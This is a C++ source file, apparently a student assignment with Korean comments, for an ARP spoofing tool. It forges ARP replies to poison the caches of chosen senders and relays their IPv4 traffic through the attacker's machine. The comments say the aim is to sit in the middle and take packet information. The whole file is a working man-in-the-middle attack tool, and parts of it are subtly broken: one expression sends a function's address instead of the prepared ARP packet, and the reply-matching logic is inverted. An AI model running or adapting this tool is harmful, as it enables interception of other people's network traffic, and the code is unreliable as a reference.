#include "mac_ip.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]");
	printf("sample: send-arp-test wlan0\n");
}

struct Session
{
    /*
    Ip   senderIp = Sender의 IP를 담기 위한 구조체
    Mac  senderMac = Sender의 Mac을 담기 위한 구조체
    Ip   targetIp = target의 IP를 담기 위한 구조체
    Mac  targetMac = target의 Mac을 담기 위한 구조체
    EthArpPacket Arp_relay = Arp를 지속적으로 보내기 위해 선언
    */
    
    Ip   senderIp;
    Mac  senderMac;
    Ip   targetIp;
    Mac  targetMac;
    EthArpPacket Arp_relay;
};

Mac My_Mac;
Ip My_IP;

/* 맥 주소 읽어오는 함수 참고 링크 */
/* https://bit.ly/3wkFJLt */
int get_MyMac(char *mac_str, const char *if_name)
{
	struct sockaddr macaddr;
	struct ifreq ifr;
	int	ret = 0;
	int	fd;

	memset(&macaddr, 0x00, sizeof(macaddr));
	
	if((fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
		return -1;
	}
	
	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, if_name);
	if(ioctl(fd, SIOCGIFHWADDR, &ifr) == 0){
		memcpy(&macaddr, &ifr.ifr_hwaddr, sizeof(ifr.ifr_hwaddr));
		ret =  1;
	}
	
	sprintf(mac_str,"%02x:%02x:%02x:%02x:%02x:%02x",
				(unsigned char)macaddr.sa_data[0],(unsigned char)macaddr.sa_data[1],(unsigned char)macaddr.sa_data[2],
				(unsigned char)macaddr.sa_data[3],(unsigned char)macaddr.sa_data[4],(unsigned char)macaddr.sa_data[5]);

	close(fd);
	return ret;
}

/* IP 주소 읽어오는 함수 참고 링크 */
/* https://bit.ly/3caDmE8 */
int get_myIP(char *ip_str, const char *if_name)
{
	struct sockaddr		ip_addr;
	struct sockaddr_in 	*ip_addr_2;
	struct ifreq ifr;
	int	ret = 0;
	int	fd;
	
	if((fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) 
	{
        printf("소켓 정보를 읽어올 수 없습니다.\n");
		return -1;
	}
	
	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, if_name);
	if(ioctl(fd, SIOCGIFADDR, &ifr) == 0)
	{
		memcpy(&ip_addr, &ifr.ifr_addr, sizeof(struct sockaddr));
		ip_addr_2 = (struct sockaddr_in*)&ip_addr;
		strcpy(ip_str, inet_ntoa(ip_addr_2->sin_addr));
		ret =  1;
	}
	
	close(fd);
	return ret;
}

// 구조체를 통해 입력받은 SenderIp 값을 통해 Mac 반환
Mac requestMac(pcap_t* handle, Ip senderIp)
{
    EthArpPacket Packet;

    Packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    Packet.eth_.smac_ = My_Mac;
    Packet.eth_.type_ = htons(EthHdr::Arp);

    Packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    Packet.arp_.pro_ = htons(EthHdr::Ip4);
    Packet.arp_.hln_ = Mac::SIZE;
    Packet.arp_.pln_ = Ip::SIZE;
    Packet.arp_.op_ = htons(ArpHdr::Request);
    Packet.arp_.smac_ = My_Mac;
    Packet.arp_.sip_ = htonl(My_IP);
    Packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    Packet.arp_.tip_ = htonl(senderIp);

    /* eth arp 순서
	Packet.eth_.dmac_ = Broadcast (ff:ff:ff:ff:ff:ff:ff)
	Packet.eth_.smac_ = My Mac

	Packet.arp_.smac_ = My Mac
	Packet.arp_.sip_ = My IP (htonl를 통해서 엔디안 변환)
	Packet.arp_.tmac_ = Broadcast (00:00:00:00:00:00:00)
	Packet.arp_.tip_ = Gateway IP
	*/

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // 지속적인 Reply 를 위해 선언
    EthArpPacket* receive_packet = nullptr;
    
    while(1)
    {
        struct pcap_pkthdr* header;
        const  u_char*      packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        
        receive_packet = (EthArpPacket*)packet;  // 패킷을 가져와서
        
        receive_packet = (EthArpPacket*)packet;
        
        if(receive_packet->eth_.type() != EthHdr::Arp){
             if(receive_packet->arp_.op() != ArpHdr::Reply){
                 if(receive_packet->arp_.sip() != senderIp){
                    continue;
                 }
             }
        }
        else{
			break;
		}
    }
    return Mac(receive_packet->arp_.smac_);
}

// 선언해두었던 session을 이용하여 ARp relay 진행
void send_Arp_relay(Session* session)
{
    session->Arp_relay.eth_.dmac_ = session->senderMac;
    session->Arp_relay.eth_.smac_ = My_Mac;
    session->Arp_relay.eth_.type_ = htons(EthHdr::Arp);

    session->Arp_relay.arp_.hrd_ = htons(ArpHdr::ETHER);
    session->Arp_relay.arp_.pro_ = htons(EthHdr::Ip4);
    session->Arp_relay.arp_.hln_ = Mac::SIZE;
    session->Arp_relay.arp_.pln_ = Ip::SIZE;
    session->Arp_relay.arp_.op_ = htons(ArpHdr::Reply);
    session->Arp_relay.arp_.smac_ = My_Mac;
    session->Arp_relay.arp_.sip_ = htonl(session->targetIp);
    session->Arp_relay.arp_.tmac_ = session->senderMac;
    session->Arp_relay.arp_.tip_ = htonl(session->senderIp);

    /* relay 순서
	session->Arp_relay.eth_.dmac_ = senderMac 을 session 으로 변경
    session->Arp_relay.eth_.smac_ = senderMac 은 나의 맥 그대로
    session->Arp_relay.eth_.type_ = htons(EthHdr::Arp);

    session->Arp_relay.arp_.hrd_ = htons(ArpHdr::ETHER);
    session->Arp_relay.arp_.pro_ = htons(EthHdr::Ip4);
    session->Arp_relay.arp_.hln_ = Mac::SIZE;
    session->Arp_relay.arp_.pln_ = Ip::SIZE;
    session->Arp_relay.arp_.op_ = htons(ArpHdr::Reply); 지속적인 Reply 진행
    session->Arp_relay.arp_.smac_ = My_Mac;
    session->Arp_relay.arp_.sip_ = htonl(session->targetIp); target을 나로 변경
    session->Arp_relay.arp_.tmac_ = session->senderMac;
    session->Arp_relay.arp_.tip_ = htonl(session->senderIp);

    sender Mac은 나인채로 둔 상태를 유지하고 내 스스로가 Gateway, 즉 sender인 것처럼 중간에 패킷 정보 탈취
	*/
}

int main(int argc, char* argv[]) {
    //Mac, IP 에 대한 정보 배열 값 선언
	char m_MAC[20];
    char m_IP[20];

    //필요한거만 설정
	//char s_MAC[20];
	//char* s_IP = argv[2];
	//char* t_IP = argv[3];

    //이번에는 여러번 받을 수 있게 변경
    if (argc < 4 || argc%2 != 0) {
        usage();
        return -1;
    }

    // interface 정보 받아오기
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		//올바르지 않은 값인 경우 오류 출력
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    //각 함수 값이 올바르게 들어오지 않은 경우 종료
	if(!get_MyMac(m_MAC, dev)){
		exit(1);
	}
	if(!get_myIP(m_IP, dev)){
		exit(1);
	}

    //구조체에 정의해둔 값에 넣어서 함수에서 활용
    My_Mac = Mac(m_MAC);
    My_IP = Ip(m_IP);

    //여러개의 아이피를 받기 때문에 세션 정보를 할당
    int Session_Number = (argc-2) / 2;
    printf("세션 번호 [#%d]\n", Session_Number-1);

    //배열을 통해 세션 크기 할당
    //정해진 크기 이상으로 할당 될 경우 에러 반환
    Session* session = new Session[Session_Number];
    if(session == nullptr)
    {
        fprintf(stderr, "세션 크기 이상으로 할당 했습니다!\n");
        return -1;
    }

    // argv 값을 통해 세션에 대한 IP 값 입력 받기
    for(int i = 2; i < argc; i+=2)
    {
        /* argv[0] : ./send-arp-test
        argv[1] : interface
        argv[2] : sendIP
        argv[3] : targetIP */
        session[(i/2)-1].senderIp = Ip(argv[i]);
        session[(i/2)-1].targetIp = Ip(argv[i+1]);
        printf("[세션 번호 #%d] 전송할 IP 주소 = %s\n", (i/2)-1, argv[i]);
        printf("[세션 번호 #%d] 타겟의 IP 주소 = %s\n", (i/2)-1, argv[i+1]);
    }
    
    // Victim Mac Address 와 같이 ARP 변조에 필요한 값 얻어옴
    for(int i = 0; i < Session_Number; i++)
    {
        session[i].senderMac = requestMac(handle, session[i].senderIp);
        session[i].targetMac = requestMac(handle, session[i].targetIp);
        send_Arp_relay(&session[i]);
        printf("패킷 전송을 위해 Victim Mac Address 를 얻어옵니다 . . . \n");
    }
    
    printf("ARP 정보 변조 성공!\n");

    // ARP Packet 변조
    for(int i = 0; i < Session_Number; i++)
    {
        int res = pcap_sendpacket(
            handle, 
            reinterpret_cast<const u_char*>( &(session[i],send_Arp_relay) ), 
            sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }

    // relay 하기 위해 반복
    while(true){
        struct pcap_pkthdr* header;
        const  u_char*      packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0){
            continue;
        }
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthHdr*      Packet_spoof = (EthHdr*)packet;
        bpf_u_int32  Packet_spoof_size = header->caplen;

        // 세션에 대하여 패킷과 비교
        for(int i = 0; i < Session_Number; i++)
        {
            if(Packet_spoof->smac() != session[i].senderMac){ // sender의 Mac 이 아닌 경우
                if(Packet_spoof->dmac() != My_Mac){ // 나에게 relay 된 것이 아닌 경우
                    continue;  
                }
            }     
            // ip 패킷이 정상적으로 온 경우
            if(Packet_spoof->type() == EthHdr::Ip4){
                // dmac 과 smac 의 정보를 변경
                Packet_spoof->dmac_ = session[i].targetMac;
                Packet_spoof->smac_ = My_Mac;

                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(Packet_spoof), Packet_spoof_size);
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
                printf("[세션 번호 #%d] 패킷 캡쳐 완료 ! ! - ( %u bytes ) \n", i, Packet_spoof_size);
            }

            // ARP 패킷이 정상적으로 온 경우
            else if(Packet_spoof->type() == EthHdr::Arp){
                res = pcap_sendpacket(
                    handle, reinterpret_cast<const u_char*>( &(session[i] ,send_Arp_relay) ), sizeof(EthArpPacket));
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
                printf("[세션 번호 #%d] ARP 패킷 정보 재전송 ! ! \n", i);
            }
        }
    }
    delete[] session;
    session = nullptr;
    pcap_close(handle);
}